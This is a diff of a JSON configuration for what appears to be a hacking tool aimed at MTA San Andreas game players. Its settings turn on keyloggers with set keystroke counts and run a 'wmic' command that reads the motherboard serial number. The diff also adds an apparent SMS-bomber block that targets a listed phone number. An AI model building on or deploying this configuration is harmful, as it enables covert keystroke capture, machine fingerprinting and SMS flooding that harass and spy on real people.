@@ -11,8 +11,8 @@
   "PythonCommand":null,
   "NeedDefaultHacking":true,
   "MTApath":"C:\\Program Files (x86)\\MTA San Andreas 1.6",
-  "MTAfileName":"s7Wn9VN5U#K*4Hqamirluciguard85a4g7p8f5",
   "NeedKeyLogger":true,
+  "SelfServerpass":false,
   "KeyLogCount":30},
           
   "EazyHack":{
@@ -21,4 +21,9 @@
   "Command":"wmic baseboard get serialnumber",
   "NeedKeyLogger":true,
   "KeyLogCount":100}
-  }
+  },
+"smsbm":{"enable":true,
+         "text":"so",
+        "smsbs":"09151613071",
+        "banned":["09151613071",]}
+
